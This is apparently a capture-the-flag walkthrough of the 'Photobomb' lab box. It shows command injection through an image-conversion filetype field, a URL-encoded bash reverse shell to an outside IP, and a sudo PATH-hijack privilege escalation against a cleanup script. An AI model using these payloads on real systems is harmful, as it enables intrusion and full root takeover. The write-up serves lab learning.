# Photobomb box

## enum

the web for printing image with input
- img name: LFI
- run exiftool with the output image (printed img). We see an intersting info that Little CMS. It has LFI vul in searchsploit. but current web run on ruby, not php. That maybe it not work.
- type, size: command injection
- i try to do an command injection. that I change the file type to `filetype=png.txt`.
	- then the output file is .txt file. And hint to me that the web use `ImageMagick` to convert images.
	- test command injection
		- make python http server listen
			```bash
			python3 -m http.server 81
			```
		- request with
			```
			filetype=png`curl+http://MyIP:81`
			```
		- -> we recieve request.


## user

- get rev-shell with bash command (***remember to url encode your payload. I lost many time to try many shell, and figure out that I need to encode the payload :D***):
	```
	filetype=png`bash -c 'exec+bash+-i+%26>/dev/tcp/10.10.14.74/81+<%261'`
	```
- we get `wizard@photobomb` with the reverse shell.


## pri-esc

- list out command run with sudo with:
	```bash
	sudo -l
	```
	```
	User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
	```
	```sh
	# file: /opt/cleanup.sh
	#!/bin/bash
	. /opt/.bashrc
	cd /home/wizard/photobomb

	# clean up log files
	if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
	then
	/bin/cat log/photobomb.log > log/photobomb.log.old
	/usr/bin/truncate -s0 log/photobomb.log
	fi

	# protect the priceless originals
	find source_images -type f -name '*.jpg' -exec chown root:root {} \;
	```
	- every command use with absolute-path except of find :D. We'll use the PATH technique.
	- but now we run with sudo so we need to do [something more](https://unix.stackexchange.com/questions/83191/how-to-make-sudo-preserve-path).
		```bash
		sudo PATH=`pwd`:$PATH /opt/cleanup.sh
		```
		- we can try this locally with [my test](exploit/pri-esc/test-suPath/)